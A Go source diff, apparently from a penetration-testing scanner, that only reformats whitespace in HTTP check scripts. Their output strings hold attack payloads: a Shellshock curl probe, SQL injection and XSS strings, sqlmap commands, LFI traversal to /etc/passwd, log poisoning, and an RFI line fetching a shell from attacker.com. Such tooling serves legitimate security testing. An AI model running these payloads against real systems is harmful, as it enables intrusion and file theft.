@@ -43,11 +43,11 @@ func (s *HTTPMethodsScript) Execute(target ScriptTarget) (*ScriptResult, error) 
 
 	result := &ScriptResult{ScriptName: s.Name()}
 	allow := resp.Header.Get("Allow")
-	
+
 	if allow != "" {
 		result.Output = fmt.Sprintf("Allowed HTTP Methods: %s", allow)
 		result.Findings = append(result.Findings, allow)
-		
+
 		// Check for dangerous methods
 		dangerous := []string{"PUT", "DELETE", "TRACE", "CONNECT"}
 		for _, method := range dangerous {
@@ -99,10 +99,10 @@ func (s *HTTPRobotsScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	if resp.StatusCode == 200 {
 		body, _ := io.ReadAll(resp.Body)
 		robotsTxt := string(body)
-		
+
 		if len(robotsTxt) > 0 {
 			result.Output = fmt.Sprintf("robots.txt found:\n%s", robotsTxt[:minInt(len(robotsTxt), 500)])
-			
+
 			// Look for interesting paths
 			lines := strings.Split(robotsTxt, "\n")
 			for _, line := range lines {
@@ -135,23 +135,23 @@ func (s *HTTPEnumScript) PortRule(port int, service string) bool {
 
 func (s *HTTPEnumScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	commonPaths := []string{
 		"/admin", "/login", "/administrator", "/phpmyadmin",
 		"/uploads", "/upload", "/files", "/backup", "/backups",
 		"/dev", "/test", "/tmp", "/temp", "/api", "/console",
 		"/.git", "/.svn", "/.env", "/config", "/wp-admin",
 	}
-	
+
 	result.Output = fmt.Sprintf("HTTP Enumeration Suggestions:\n\nCommon paths to check:\n%s\n\nTools to use:\n- gobuster dir -u http://%s:%d -w /usr/share/wordlists/dirb/common.txt\n- feroxbuster -u http://%s:%d\n- nikto -h http://%s:%d\n- wfuzz -w wordlist.txt http://%s:%d/FUZZ",
 		strings.Join(commonPaths, "\n"),
 		target.Host, target.Port,
 		target.Host, target.Port,
 		target.Host, target.Port,
 		target.Host, target.Port)
-	
+
 	result.Findings = append(result.Findings, "Directory enumeration recommended")
-	
+
 	return result, nil
 }
 
@@ -215,27 +215,29 @@ func (s *HTTPBackupFilesScript) PortRule(port int, service string) bool {
 
 func (s *HTTPBackupFilesScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	backupPatterns := []string{
 		"index.php~", "index.php.bak", "index.php.old", "index.php.backup",
 		"config.php.bak", "backup.sql", "backup.zip", "backup.tar.gz",
 		"db_backup.sql", "site.zip", "www.zip", "backup.rar",
 	}
-	
+
 	result.Output = fmt.Sprintf("Common backup file patterns to check:\n%s\n\nExample: curl http://%s:%d/config.php.bak",
 		strings.Join(backupPatterns, "\n"),
 		target.Host, target.Port)
-	
+
 	result.Findings = append(result.Findings, "Check for backup files")
-	
+
 	return result, nil
 }
 
 // HTTPCGIScript checks for CGI vulnerabilities
 type HTTPCGIScript struct{}
 
-func (s *HTTPCGIScript) Name() string        { return "http-shellshock" }
-func (s *HTTPCGIScript) Description() string { return "Checks for Shellshock (CVE-2014-6271) vulnerability" }
+func (s *HTTPCGIScript) Name() string { return "http-shellshock" }
+func (s *HTTPCGIScript) Description() string {
+	return "Checks for Shellshock (CVE-2014-6271) vulnerability"
+}
 func (s *HTTPCGIScript) Categories() []ScriptCategory {
 	return []ScriptCategory{CategoryVuln, CategorySafe}
 }
@@ -245,10 +247,10 @@ func (s *HTTPCGIScript) PortRule(port int, service string) bool {
 
 func (s *HTTPCGIScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	result.Output = "Shellshock Check:\nNote: Affects servers with CGI scripts using vulnerable Bash\nCommon CGI paths: /cgi-bin/, /cgi-sys/, /cgi-mod/\nTest with: curl -H \"User-Agent: () { :; }; echo vulnerable\" http://<target>/cgi-bin/test.cgi\nMetasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec"
 	result.Findings = append(result.Findings, "Check for Shellshock if CGI present")
-	
+
 	return result, nil
 }
 
@@ -266,10 +268,10 @@ func (s *HTTPSQLMapScript) PortRule(port int, service string) bool {
 
 func (s *HTTPSQLMapScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	result.Output = "SQL Injection Testing:\nManual tests: ', \", --;, ' OR '1'='1, ' OR 1=1--\nTools:\n- sqlmap -u \"http://<target>/page.php?id=1\" --batch\n- sqlmap -r request.txt --batch --level=5 --risk=3\nLook for: Error messages, time delays, boolean-based blind SQLi"
 	result.Findings = append(result.Findings, "Test for SQL injection")
-	
+
 	return result, nil
 }
 
@@ -287,10 +289,10 @@ func (s *HTTPXSSScript) PortRule(port int, service string) bool {
 
 func (s *HTTPXSSScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	result.Output = "XSS Testing:\nReflected: <script>alert(1)</script>\nStored: Test input forms and comment sections\nDOM-based: Check JavaScript handling of URL parameters\nTools: xsser, dalfox\nBypasses: <img src=x onerror=alert(1)>, <svg onload=alert(1)>"
 	result.Findings = append(result.Findings, "Test for XSS vulnerabilities")
-	
+
 	return result, nil
 }
 
@@ -308,7 +310,7 @@ func (s *HTTPLFIScript) PortRule(port int, service string) bool {
 
 func (s *HTTPLFIScript) Execute(target ScriptTarget) (*ScriptResult, error) {
 	result := &ScriptResult{ScriptName: s.Name()}
-	
+
 	result.Output = `LFI/RFI Testing:
 Payloads:
 - ../../../etc/passwd
@@ -326,9 +328,9 @@ Log poisoning:
 - /var/log/mail (poison via SMTP)
 
 RFI: http://attacker.com/shell.txt`
-	
+
 	result.Findings = append(result.Findings, "Test for LFI/RFI vulnerabilities")
-	
+
 	return result, nil
 }
 
